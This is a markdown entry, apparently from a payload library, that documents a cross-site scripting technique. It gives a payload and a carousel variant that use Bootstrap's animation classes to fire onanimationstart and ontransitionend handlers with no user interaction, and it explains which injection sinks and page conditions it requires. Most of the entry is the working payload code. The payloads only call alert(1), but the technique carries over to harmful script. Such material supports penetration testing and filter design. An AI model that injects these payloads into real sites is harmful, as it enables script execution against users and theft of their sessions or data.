---
title: Bootstrap CSS Class Animation Event Handlers
slug: bootstrap-animation-csti
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML, sink/bootstrap]
inbound: []
---

# Bootstrap CSS Class Animation Event Handlers

## Payload

```html
<xss class=progress-bar-animated onanimationstart=alert(1)>
```

## Variants

```html
<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
```

## Context

When Bootstrap CSS is loaded on the page, its built-in keyframe animations (progress bar spin, carousel slide transitions) attach to elements by class name. An injected element with the matching Bootstrap class inherits the CSS animation, causing `onanimationstart` / `ontransitionend` to fire without user interaction and without needing to inject a `<style>` block. Requires Bootstrap CSS to be present (check for `bootstrap.css` or `bootstrap.min.css` in page resources). Sink: `innerHTML`, `outerHTML`, `document.write`.

## Provenance

- Distilled from: `../../techniques/dom-xss/client-side-template-injection.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
- [CSS Animation Event Handlers](../../payloads/dom-xss/css-animation-event-handlers.md)
